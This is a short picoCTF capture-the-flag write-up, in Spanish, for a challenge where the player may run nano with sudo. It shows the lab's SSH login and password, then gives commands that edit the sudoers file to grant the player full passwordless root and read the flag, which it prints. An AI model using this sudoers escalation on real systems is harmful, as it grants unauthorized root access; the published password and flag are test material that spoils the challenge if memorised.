
## Descripción:

You have complete power with nano.
Think you can get the flag?
`ssh -p 62108 ctf-player@crystal-peak.picoctf.net` using password `c4feea17`

## Solucion

```jsx
ssh -p 62108 [ctf-player@crystal-peak.picoctf.net](mailto:ctf-player@crystal-peak.picoctf.net)
```

Identificación de vulnerabilidad (Sudo Privileges):

```jsx
sudo -l
```

Escalada de privilegios vía edición de Sudoers:

```jsx
sudo /bin/nano /etc/

```

Acción: Dentro de nano, se modifica la última línea para dar permisos totales al usuario:

```jsx

ctf-player ALL=(ALL:ALL) NOPASSWD: ALL
```

Localización de la flag:

```jsx
sudo find / -name "flag.txt" 2>/dev/null
```

Lectura de la flag con privilegios elevados:

```
sudo cat /home/ctf-player/flag.txt
```

Flag obtenida: picoCTF{n4n0_411_7h3_w4y_7fcf8f8d}